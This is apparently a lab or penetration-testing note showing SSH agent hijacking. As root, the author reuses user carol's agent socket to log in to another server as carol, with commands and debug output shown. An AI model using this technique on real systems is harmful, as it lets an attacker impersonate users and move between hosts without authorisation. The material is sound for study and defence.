# SSH Agent Hijacking

## Verify SSH Agent Socket

Configure the SSH agent socket variables:

```shell-session
root@linux-srv-04:/home/carol# export SSH_AUTH_SOCK=$(ls /tmp/ssh-*/agent.*)

root@linux-srv-04:/home/carol# echo $SSH_AUTH_SOCK 
/tmp/ssh-Wl1006hh94/agent.16
```

List the loaded keys of the SSH agent:

```shell-session
root@linux-srv-04:/home/carol# ssh-add -l
3072 SHA256:tXOa/lXINMBn+KG4oa4lb6NV3OObTUZqh0hYNwEUexg carol@jumpy (RSA)
```

- It's possible to communicate with the SSH agent of `carol`.
- `carol` has loaded an RSA key in her SSH agent with the name `carol@jumpy`

## SSH Agent Hijacking

Use the SSH agent socket of `carol` to authenticate to `linux-srv-05` as `carol`:

```shell-session
root@linux-srv-04:/home/carol# ssh -v carol@linux-srv-05
[...]
debug1: Authentications that can continue: publickey
debug1: Next authentication method: publickey
debug1: get_agent_identities: bound agent to hostkey
debug1: get_agent_identities: agent returned 1 keys
debug1: Will attempt key: carol@jumpy RSA SHA256:tXOa/lXINMBn+KG4oa4lb6NV3OObTUZqh0hYNwEUexg agent
[...]
debug1: Offering public key: carol@jumpy RSA SHA256:tXOa/lXINMBn+KG4oa4lb6NV3OObTUZqh0hYNwEUexg agent
debug1: Server accepts key: carol@jumpy RSA SHA256:tXOa/lXINMBn+KG4oa4lb6NV3OObTUZqh0hYNwEUexg agent
Authenticated to linux-srv-05 ([172.17.0.7]:22) using "publickey".
[...]

carol@linux-srv-05:~$ hostname
linux-srv-05.nullbyte.internal
carol@linux-srv-05:~$ id
uid=1000(carol) gid=1000(carol) groups=1000(carol),27(sudo)
```

- The RSA key from the SSH agent was offered and accepted by the server.
- It was possible to perform a login on `linux-srv-05` as `carol`.